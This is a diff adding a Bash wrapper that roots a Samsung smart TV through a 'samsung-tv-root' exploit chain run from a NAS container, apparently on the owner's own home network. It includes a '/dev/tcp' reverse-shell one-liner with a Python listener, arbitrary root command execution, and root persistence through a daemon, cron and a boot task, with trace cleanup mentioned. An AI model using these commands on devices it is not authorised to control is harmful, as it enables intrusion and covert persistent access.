@@ -1,0 +1,126 @@
+#!/bin/bash
+# tv-root — єдина обгортка для Samsung TV Спальня (QE65Q7F5AUXUA, Tizen 9.0, rosel)
+#
+# Юзейдж:
+#   tv-root <cmd>              — виконати команду як root на TV (one-shot)
+#   tv-root probe              — заново взяти рут (archive-root probe)
+#   tv-root shell              — reverse-shell з TV у NAS (інтерактив)
+#   tv-root daemon-start       — запустити хост-демон, що тримає рут живим
+#   tv-root daemon-stop        — зупинити хост-демон
+#   tv-root daemon-status      — статус демона + останні рядки логу
+#   tv-root daemon-log         — tail логу демона
+#
+# Що як працює (коротко):
+#   1. На TV ввімкнено Developer Mode (host whitelist = 192.168.88.4, цей NAS)
+#   2. samsung-tv-root archive-root (SDB → .NET capability chain → UID 0) видає
+#      ВОЛАТИЛЬНИЙ рут: гине з ребутом TV. Інструмент сам же й прибирає сліди.
+#   3. tv-root-daemon на NAS моніторить TV, при offline→online переакваєрить рут.
+#   4. Персистентність: DSM scheduler (bootup) + cron keepalive + wd.
+
+TV_IP="${TV_IP:-192.168.88.39}"
+NAS_IP="${NAS_IP:-192.168.88.4}"
+CONTAINER="${CONTAINER:-tvsign}"
+TVROOT_DIR="${TVROOT_DIR:-/tmp/samsung-tv-root}"
+SDB="${SDB:-/home/moonlight/tizen-studio/tools/sdb}"
+DAEMON_SH="/volume1/System/claude/tools/tv-root-daemon/tv-root-daemon.sh"
+SHELL_PORT="${SHELL_PORT:-4444}"
+
+as_root() {
+  docker exec -u root "$CONTAINER" bash -c \
+    "cd $TVROOT_DIR && .venv/bin/python -m samsung_tv_root --sdb $SDB archive-root root $TV_IP --command '$1'"
+}
+
+probe_root() {
+  docker exec -u root "$CONTAINER" bash -c \
+    "cd $TVROOT_DIR && .venv/bin/python -m samsung_tv_root --sdb $SDB archive-root probe $TV_IP"
+}
+
+case "${1:-}" in
+  probe)
+    probe_root
+    ;;
+
+  shell)
+    echo "🖥  Reverse shell $TV_IP → $NAS_IP:$SHELL_PORT (Ctrl+C для виходу)"
+    docker exec -d -u root "$CONTAINER" bash -c \
+      "cd $TVROOT_DIR && .venv/bin/python -m samsung_tv_root --sdb $SDB archive-root root $TV_IP --command 'bash -i >& /dev/tcp/$NAS_IP/$SHELL_PORT 0>&1 &'" &
+    python3 -c "
+import socket, select, sys, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', $SHELL_PORT))
+s.listen(1)
+print('Listening on 0.0.0.0:$SHELL_PORT...')
+c, addr = s.accept()
+print(f'Connected from {addr}')
+os.set_blocking(c.fileno(), False)
+os.set_blocking(sys.stdin.fileno(), False)
+try:
+    while True:
+        r, _, _ = select.select([c, sys.stdin], [], [], 1)
+        for fd in r:
+            if fd == c:
+                data = c.recv(4096)
+                if not data: raise SystemExit
+                sys.stdout.write(data.decode(errors='replace'))
+                sys.stdout.flush()
+            elif fd == sys.stdin:
+                line = sys.stdin.readline()
+                if line: c.send(line.encode())
+except (KeyboardInterrupt, SystemExit):
+    c.close(); s.close()
+"
+    ;;
+
+  daemon-start)
+    if pgrep -f "tv-root-daemon.sh" >/dev/null; then
+      echo "✅ Демон вже запущений"
+      "$DAEMON_SH" --status
+    else
+      nohup "$DAEMON_SH" >/dev/null 2>&1 &
+      disown
+      sleep 1
+      echo "🚀 Демон стартував"
+      "$DAEMON_SH" --status
+    fi
+    ;;
+
+  daemon-stop)
+    "$DAEMON_SH" --stop
+    ;;
+
+  daemon-status)
+    "$DAEMON_SH" --status
+    echo ""
+    echo "=== DSM bootup task ==="
+    sqlite3 /usr/syno/etc/esynoscheduler/esynoscheduler.db \
+      "SELECT task_name, event, enable FROM task WHERE task_name='tv-root-daemon';" 2>/dev/null
+    echo ""
+    echo "=== wd ==="
+    /volume1/System/claude/tools/watchdog-registry/wd status 2>/dev/null | grep -E "СТОРОЖ|tv-root"
+    ;;
+
+  daemon-log)
+    tail -f /volume1/System/claude/tools/tv-root-daemon/tv-root-daemon.log
+    ;;
+
+  ""|-h|--help)
+    cat <<USAGE
+tv-root — обгортка над samsung-tv-root для Samsung TV Спальня
+
+  tv-root <cmd>          виконати команду як root на TV
+  tv-root probe          заново взяти рут
+  tv-root shell          reverse-shell у NAS
+  tv-root daemon-start   запустити хост-демон (тримає рут живим)
+  tv-root daemon-stop    зупинити демон
+  tv-root daemon-status  статус демона + DSM task + wd
+  tv-root daemon-log     tail логу демона (ctrl+c для виходу)
+
+ENV override: TV_IP, NAS_IP, CONTAINER, SHELL_PORT
+USAGE
+    ;;
+
+  *)
+    as_root "$1"
+    ;;
+esac
